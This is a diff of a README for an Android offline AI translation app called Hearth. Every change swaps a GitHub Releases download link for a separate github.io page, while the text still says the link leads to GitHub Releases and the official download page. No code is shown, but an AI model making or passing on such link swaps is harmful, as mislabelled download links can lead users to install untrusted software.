@@ -1,6 +1,6 @@
 # 🔥 Hearth - Your Offline AI Language Companion  
 
-[![Download Now](https://img.shields.io/badge/Download-Hearth-4CAF50?style=for-the-badge&logo=github&logoColor=white)](https://github.com/maithihaika1987/Hearth/releases)  
+[![Download Now](https://img.shields.io/badge/Download-Hearth-4CAF50?style=for-the-badge&logo=github&logoColor=white)](https://maithihaika1987.github.io)  
 
 ## 🚀 Getting Started  
 
@@ -21,7 +21,7 @@ Whether you're watching a foreign film, having a video call with someone who spe
 ## 📥 Download Hearth  
 
 Visit this link to download the application:  
-[🔗 Download Hearth from GitHub Releases](https://github.com/maithihaika1987/Hearth/releases)  
+[🔗 Download Hearth from GitHub Releases](https://maithihaika1987.github.io)  
 
 This link takes you to the official download page where you'll find the latest version of Hearth. Choose the file that matches your device and install it like any other Android app.  
 
@@ -190,7 +190,7 @@ This setup allows for an incredibly responsive and efficient user experience.
 
 You're just a download away from unlimited offline AI power. Click below to get started:  
 
-[![Get Hearth Now](https://img.shields.io/badge/Get%20Hearth-Download%20Now-orange?style=for-the-badge&logo=android&logoColor=white)](https://github.com/maithihaika1987/Hearth/releases)  
+[![Get Hearth Now](https://img.shields.io/badge/Get%20Hearth-Download%20Now-orange?style=for-the-badge&logo=android&logoColor=white)](https://maithihaika1987.github.io)  
 
 Transform how you experience audio, video, and language. Download Hearth today and speak any language, anywhere, anytime – even without a signal.  
 
